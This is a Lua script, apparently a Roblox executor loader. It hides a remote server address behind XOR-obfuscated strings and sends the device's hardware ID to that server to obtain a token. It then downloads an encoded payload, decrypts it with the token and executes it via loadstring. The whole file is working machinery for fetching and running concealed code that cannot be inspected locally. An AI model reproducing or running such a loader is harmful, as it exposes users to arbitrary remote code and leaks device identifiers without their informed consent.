local _1258da=133
local _8a3ff7=16
local _e8001b={{237,225,209,197,182,239,202,218,119,122,74,88,38,58,23,17,171,241,213,209,171,166,203,154,119,114},{170,244,213,220,234,161,138,158,96,123},{170,244,213,220,234,179,128,129,102,125,26,65,120},{163,253,210,220,161,232},{241,250,206,208,171},{245,244,220,217,170,180,129},{224,231,215,218,183},{246,246,215,220,181,161,172,145},{237,226,204,209},{198,250,203,193,160,187,145,216,81,108,85,80},{228,229,213,217,172,182,132,129,108,122,75,26,47,38,10,27},{215,247,221,244,171,180,137,140,113,124,70,70,22,48,23,3,236,246,192},{194,240,209,246,169,188,128,155,113,92,65},{222,231,202,218,168,182,138,135,97,72,5}}
local function _3aa8b0(i)
local t=_e8001b[i+1];local k=_1258da;local o={}
for j=1,#t do
o[j]=string.char(bit32.bxor(t[j],k))
k=bit32.band(k+_8a3ff7,0xFF)
if k==0 then k=_8a3ff7 end
end
return table.concat(o)
end
local VAULT_BASE=_3aa8b0(0)
local SCRIPT_ID="9uURxpPi"
local HWID_SEND=true

local function err(msg)
warn(_3aa8b0(13)..tostring(msg))
return nil
end

local b64c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local b64t={}
for i=1,#b64c do b64t[b64c:sub(i,i)]=i-1 end

local function b64d(s)
s=s:gsub("[^"..b64c.."=]","")
local o={}
for i=1,#s,4 do
local a=b64t[s:sub(i,i)] or 0
local b=b64t[s:sub(i+1,i+1)] or 0
local c=b64t[s:sub(i+2,i+2)] or 0
local d=b64t[s:sub(i+3,i+3)] or 0
local n=bit32.bor(bit32.lshift(a,18),bit32.lshift(b,12),bit32.lshift(c,6),d)
o[#o+1]=string.char(bit32.rshift(bit32.band(n,0xFF0000),16))
if s:sub(i+2,i+2)~="=" then o[#o+1]=string.char(bit32.rshift(bit32.band(n,0x00FF00),8)) end
if s:sub(i+3,i+3)~="=" then o[#o+1]=string.char(bit32.band(n,0x0000FF)) end
end
return table.concat(o)
end

local function xd(data,key)
local o={};local kl=#key
for i=1,#data do
o[i]=string.char(bit32.bxor(string.byte(data,i),string.byte(key,(i-1)%kl+1)))
end
return table.concat(o)
end

local function jg(src,f)
local sv=src:match('"'..f..'"%s*:%s*"([^"]*)"')
if sv then return sv end
local nv=src:match('"'..f..'"%s*:%s*([%d%.]+)')
if nv then return tonumber(nv) end
return nil
end

local function gh()
if type(request)=="function" then return request end
if type(http_request)=="function" then return http_request end
if type(http)=="table" and type(http.request)=="function" then return http.request end
if type(syn)=="table" and type(syn.request)=="function" then return syn.request end
return nil
end

local function hpost(url,body)
local fn=gh()
if not fn then return nil end
local ok,r=pcall(fn,{Url=url,Method="POST",Headers={[_3aa8b0(9)]=_3aa8b0(10)},Body=body})
if not ok then return nil end
if type(r)=="table" then return r.Body or r.body end
return tostring(r)
end

local function hget(url)
local fn=gh()
if fn then
local ok,r=pcall(fn,{Url=url,Method="GET"})
if ok then
if type(r)=="table" then return r.Body or r.body end
return tostring(r)
end
end
local ok,r=pcall(function() return game:HttpGet(url) end)
if ok then return r end
return nil
end

local function hwid()
local ok,id=pcall(function()
return tostring(game:GetService(_3aa8b0(11))[_3aa8b0(12)](game:GetService(_3aa8b0(11))))
end)
if ok and id and id~="" then return id end
return nil
end

local function main()
local hw=HWID_SEND and hwid() or nil
local tb='{"'.._3aa8b0(7)..'":"'..SCRIPT_ID..'"'
if hw then tb=tb..',"'.._3aa8b0(8)..'":"'..hw..'"' end
tb=tb.."}"
local tr=hpost(VAULT_BASE.._3aa8b0(1),tb)
if not tr then return err("Token request failed") end
local tid=jg(tr,_3aa8b0(4))
if not tid or #tid~=32 then
return err("Token invalid: "..(jg(tr,_3aa8b0(6)) or tr:sub(1,80)))
end
local fu=VAULT_BASE.._3aa8b0(2)..tid
if hw then fu=fu.._3aa8b0(3)..hw end
local fr=hget(fu)
if not fr then return err("Fetch failed") end
local ep=jg(fr,_3aa8b0(5))
if not ep or ep=="" then
return err("Fetch error: "..(jg(fr,_3aa8b0(6)) or fr:sub(1,80)))
end
local dec=b64d(ep)
if not dec or #dec==0 then return err("b64 failed") end
local src=xd(dec,tid)
if not src or #src==0 then return err("xor failed") end
local ch,ce=loadstring(src)
if not ch then return err("loadstring: "..tostring(ce)) end
local ok,re=pcall(ch)
if not ok then return err("runtime: "..tostring(re)) end
end
main()